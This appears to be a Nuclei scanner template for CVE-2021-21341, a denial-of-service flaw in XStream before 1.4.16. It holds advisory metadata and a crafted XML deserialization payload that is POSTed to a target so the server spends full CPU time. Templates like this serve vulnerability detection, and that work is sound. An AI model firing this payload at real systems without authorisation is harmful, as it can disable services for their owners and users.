id: CVE-2021-21341

info:
  name: XStream Denial of Service via XML Manipulation
  author: ProjectDiscoveryAI
  severity: high
  description: |
    In XStream before version 1.4.16, there is a vulnerability that may allow a remote attacker to allocate 100% CPU time on the target system by manipulating the processed input stream, resulting in a denial of service.
  impact: |
    Successful exploitation could lead to a denial of service condition on the target system.
  remediation: |
    Apply the official patch provided by XStream to mitigate the denial of service vulnerability.
  reference:
    - http://x-stream.github.io/changes.html#1.4.16
    - https://github.com/x-stream/xstream/security/advisories/GHSA-2p3x-qw9c-25hh
    - https://lists.apache.org/thread.html/r8244fd0831db894d5e89911ded9c72196d395a90ae655414d23ed0dd%40%3Cusers.activemq.apache.org%3E
    - https://lists.apache.org/thread.html/r9ac71b047767205aa22e3a08cb33f3e0586de6b2fac48b425c6e16b0%40%3Cdev.jmeter.apache.org%3E
    - https://lists.debian.org/debian-lts-announce/2021/04/msg00002.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cve-id: CVE-2021-21341
    cwe-id: CWE-400,CWE-502
    epss-score: 0.0107
    epss-percentile: 0.84814
    cpe: cpe:2.3:a:xstream_project:xstream:*:*:*:*:*:*:*:*
  metadata:
    vendor: xstream_project
    product: xstream

http:
  - method: POST
    path:
      - "{{BaseURL}}/path/to/vulnerable/endpoint"

    body: |
      <java.util.PriorityQueue serialization='custom'>
        <unserializable-parents/>
        <java.util.PriorityQueue>
          <default>
            <size>2</size>
            <comparator class='javafx.collections.ObservableList$1'/>
          </default>
          <int>3</int>
          <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>
            <dataHandler>
              <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
                <is class='java.io.ByteArrayInputStream'>
                  <buf></buf>
                  <pos>-2147483648</pos>
                  <mark>0</mark>
                  <count>0</count>
                </is>
                <consumed>false</consumed>
              </dataSource>
              <transferFlavors/>
            </dataHandler>
            <dataLen>0</dataLen>
          </com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>
          <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/>
        </java.util.PriorityQueue>
      </java.util.PriorityQueue>

    headers:
      Content-Type: application/xml
    matchers:
      - type: word
        words:
          - "Security framework of XStream not explicitly initialized, using predefined black list on your own risk."
        part: body
